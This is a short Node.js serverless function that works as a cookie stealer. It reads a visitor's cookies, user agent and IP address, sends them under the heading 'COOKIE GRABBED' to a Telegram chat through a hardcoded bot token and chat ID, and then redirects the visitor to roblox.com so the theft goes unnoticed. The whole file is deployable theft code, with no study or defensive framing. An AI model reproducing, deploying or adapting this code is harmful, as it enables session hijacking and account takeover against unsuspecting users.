const fetch = require('node-fetch');

exports.handler = async (event) => {
  const BOT_TOKEN = '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM';
  const CHAT_ID = '7695851744';
  
  try {
    const cookies = event.headers.cookie || 'No cookies';
    const userAgent = event.headers['user-agent'] || 'Unknown';
    const ip = event.headers['client-ip'] || 'Unknown';

    const message = `🎯 COOKIE GRABBED
⏰ ${new Date().toLocaleString()}
📍 IP: ${ip}
🌐 Agent: ${userAgent.substring(0, 40)}...

🍪 COOKIES:
${cookies}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

    return {
      statusCode: 302,
      headers: {
        'Location': 'https://www.roblox.com/'
      }
    };

  } catch (error) {
    return {
      statusCode: 302,
      headers: {
        'Location': 'https://www.roblox.com/'
      }
    };
  }
};
